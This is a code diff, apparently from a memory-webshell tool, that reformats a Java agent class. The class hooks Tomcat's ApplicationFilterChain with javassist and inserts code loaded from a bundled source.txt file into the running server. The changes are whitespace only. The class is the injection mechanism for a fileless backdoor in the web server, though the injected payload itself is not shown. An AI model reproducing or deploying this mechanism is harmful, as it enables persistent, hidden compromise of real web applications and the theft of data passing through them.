@@ -1,4 +1,5 @@
 package net.rebeyond.memshell;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
@@ -13,11 +14,9 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 
-public class Transformer implements ClassFileTransformer{
+public class Transformer implements ClassFileTransformer {
     @Override
     public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {
-    	
-
         if ("org/apache/catalina/core/ApplicationFilterChain".equals(s)) {
             try {
                 ClassPool cp = ClassPool.getDefault();
@@ -31,26 +30,26 @@ public class Transformer implements ClassFileTransformer{
                 cc.detach();
                 return byteCode;
             } catch (Exception ex) {
-            	ex.printStackTrace();
-                System.out.println("error:::::"+ex.getMessage());
+                ex.printStackTrace();
+                System.out.println("error:::::" + ex.getMessage());
             }
         }
-
         return null;
     }
+
     public String readSource() {
-    	StringBuilder source=new StringBuilder();
+        StringBuilder source = new StringBuilder();
         InputStream is = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
-        InputStreamReader isr = new InputStreamReader(is); 
-        String line=null;
+        InputStreamReader isr = new InputStreamReader(is);
+        String line = null;
         try {
             BufferedReader br = new BufferedReader(isr);
-            while((line=br.readLine()) != null) {
-            	source.append(line);
+            while ((line = br.readLine()) != null) {
+                source.append(line);
             }
         } catch (Exception e) {
             e.printStackTrace();
-        } 
+        }
         return source.toString();
     }
 }
